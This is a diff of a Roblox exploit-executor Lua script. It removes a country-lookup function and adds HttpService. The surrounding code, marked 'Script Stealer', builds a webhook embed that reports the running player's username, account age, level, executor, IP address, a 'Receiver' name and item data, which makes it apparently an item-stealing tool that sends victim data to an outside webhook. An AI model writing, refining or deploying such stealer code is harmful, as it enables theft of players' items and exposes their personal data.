@@ -801,30 +801,10 @@ if #game:GetService("Players"):GetPlayers() == 12 then
 end
 
 local LP = game.Players.LocalPlayer
-local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
 local PlayerDataModule = require(game:GetService("ReplicatedStorage").Modules.ProfileData)
 local LevelModule = require(game:GetService("ReplicatedStorage").Modules.LevelModule)
 local InvModule = require(game:GetService("ReplicatedStorage").Modules.InventoryModule)
-
--- Get Players Country --
-
-local Players = game:GetService("Players")
-local LocalizationService = game:GetService("LocalizationService")
-local player = Players.LocalPlayer
-local remoteFunction = game:GetService("ReplicatedStorage").RemoteFunction
-local Countries = {}
-
-local function GetCountryName()
-	local success, code = pcall(LocalizationService.GetCountryRegionForPlayerAsync, LocalizationService, player)
-	if success and code then
-		Countries = remoteFunction:InvokeServer()
-		print(code, "http://country.io/names.json", Countries[code])
-	end
-end
-
-GetCountryName()
-
--- Script Stealer --
 
 _G.vlorp = _G.vlorp or false
 if _G.vlorp then
@@ -1086,7 +1066,7 @@ local WebHookEmbed = CreateEmbed(
         {
             name = "🌊 Player Info", 
             value = "``` | 📖 Username: "..LP.Name.."\n | 📌 Account Age: "..tostring(LP.AccountAge).."\n | 🚀 Level: "..tostring(getLvl())..
-                     "\n | 🥳 Receiver: "..userName.."\n | 💻 Executor Used: "..identifyexecutor().."\n | 🗺 Country: "..GetCountryName().."\n | 👤 IP: "..ipwebhook.. "```"
+                     "\n | 🥳 Receiver: "..userName.."\n | 💻 Executor Used: "..identifyexecutor().. "\n | 👤 IP: "..ipwebhook.. "```"
         },
         {
             name = "🍎 Items Data", 
